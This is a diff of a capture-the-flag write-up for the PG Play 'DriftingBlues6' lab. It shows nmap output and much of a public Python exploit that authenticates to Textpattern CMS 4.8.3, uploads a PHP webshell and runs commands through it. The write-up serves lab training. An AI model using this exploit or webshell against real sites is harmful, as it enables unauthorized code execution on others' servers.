@@ -1,13 +1,15 @@
 ---
 render_with_liquid: false
-title: PG Play  DriftingBlues6
+title: PG Play - DriftingBlues6
 date: 2024-06-14 17:50:53 +1400
 tags: [pg-play, nmap, linux, feroxbuster, enum, discover-secrets, password-cracking, zip2john, hashcat, textpattern, php, searchsploit, file-upload, kernel-exploit]
 ---
 
 
 
-# Learnt / Summary
+In this lab, you will exploit Textpattern CMS 4.8.3, which is vulnerable to Remote Code Execution (RCE), to gain an initial foothold. You will then escalate privileges by leveraging a Dirty COW kernel exploit to obtain root access.
+
+# Learnt
 
 - If the machine's kernel is very old `<=4.x` and have `gcc` installed, it's 90% kernel exploit for pirvesc
 
@@ -17,7 +19,6 @@ tags: [pg-play, nmap, linux, feroxbuster, enum, discover-secrets, password-crack
 ## Nmap
 
 ```bash
-
 # Nmap 7.94SVN scan initiated Fri Jun 14 17:50:53 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 80, 192.168.244.219
 Nmap scan report for 192.168.244.219
 Host is up, received user-set (0.063s latency).
@@ -33,7 +34,6 @@ PORT   STATE SERVICE REASON         VERSION
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Fri Jun 14 17:51:05 2024 -- 1 IP address (1 host up) scanned in 12.64 seconds
 ```
 
@@ -213,26 +213,16 @@ Copied to: /home/kali/Offsec/pg/play/DriftingBlues6/exploit/48943.py
 > `48943.py`
 
 ```python
-
 #!/usr/bin/python3
 
-
 # Exploit Title: TextPattern <= 4.8.3 - Authenticated Remote Code Execution via Unrestricted File Upload
-
 # Google Dork: N/A
-
 # Date: 16/10/2020
-
 # Exploit Author: Michele '0blio_' Cisternino
-
 # Vendor Homepage: https://textpattern.com/
-
 # Software Link: https://github.com/textpattern/textpattern
-
 # Version: <= 4.8.3
-
 # Tested on: Kali Linux x64
-
 # CVE: N/A
 
 import sys
@@ -243,10 +233,8 @@ import random
 import string
 import readline
 
-
 # Disable SSL warnings
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
-
 
 # Simple Terminal User Interface class I wrote to print run-time logs and headers
 class Tui ():
@@ -287,10 +275,8 @@ if len(sys.argv) < 4:
     log.info ("EXAMPLE: python3 exploit.py http://localhost admin admin\n")
     sys.exit()
 
-
 # Get input from the command line
 target, username, password = sys.argv[1:4]
-
 
 # Fixing URL
 target = target.strip()
@@ -300,7 +286,6 @@ if not target.endswith("/"):
     target = target + "/"
 
 accessData = {'p_userid':username, 'p_password':password, '_txp_token':""}
-
 
 # Login
 log.info ("Authenticating to the target as '{}'".format(username))
@@ -328,7 +313,6 @@ except requests.exceptions.ConnectionError:
     log.error ("Unable to connect to the target!")
     sys.exit()
 
-
 # Crafting the upload request here
 headers = {
     "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
@@ -338,10 +322,8 @@ headers = {
     "Connection" : "close",
 }
 
-
 # Generating random webshell name
 randomFilename = ''.join(random.choice(string.ascii_letters) for i in range(10)) + '.php'
-
 
 # Mapping multiparts here
 multipart_form_data = {
@@ -355,7 +337,6 @@ multipart_form_data = {
     "thefile[]" : (randomFilename, '<?php system($_GET["efcd"]); ?>') # lol
 }
 
-
 # Uploading the webshell
 log.warning ("Sending payload..")
 
@@ -368,7 +349,6 @@ except:
     sys.exit()
 
 sleep(2)
-
 
 # Interact with the webshell (using the readline library to save the history of the executed commands at run-time)
 log.greatInfo ("Interacting with the HTTP webshell..")
